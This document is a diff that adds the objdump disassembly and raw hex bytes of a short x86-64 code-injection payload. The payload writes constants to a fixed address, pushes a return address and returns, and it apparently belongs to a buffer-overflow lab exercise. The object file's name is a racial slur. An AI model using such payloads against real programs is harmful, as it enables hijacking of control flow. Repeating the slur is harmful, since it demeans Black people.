@@ -1,0 +1,17 @@
+
+nigga.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	49 c7 c4 08 23 60 00 	mov    $0x602308,%r12
+   7:	49 c7 04 24 bb 1e 5e 	movq   $0x285e1ebb,(%r12)
+   e:	28 
+   f:	49 c7 44 24 04 57 93 	movq   $0x61bb9357,0x4(%r12)
+  16:	bb 61 
+  18:	68 20 10 40 00       	pushq  $0x401020
+  1d:	c3                   	retq   
+  
+  
+  49 c7 c4 08 23 60 00 49 c7 04 24 bb 1e 5e 28 49 c7 44 24 04 57 93 bb 61 68 20 10 40 00 c3
